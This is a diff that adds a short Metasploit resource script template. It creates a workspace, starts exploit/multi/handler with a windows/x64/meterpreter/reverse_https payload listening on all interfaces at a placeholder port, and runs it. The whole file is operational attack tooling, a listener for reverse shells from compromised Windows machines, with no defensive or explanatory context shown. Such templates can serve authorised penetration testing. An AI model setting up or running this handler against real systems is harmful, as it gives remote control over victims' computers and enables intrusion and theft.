@@ -1,0 +1,8 @@
+workspace -a {{workspace}};
+workspace {{workspace}};
+use exploit/multi/handler;
+set payload windows/x64/meterpreter/reverse_https;
+set LHOST 0.0.0.0;
+set LPORT {{YOUR_PORT}};
+run;
+exit;
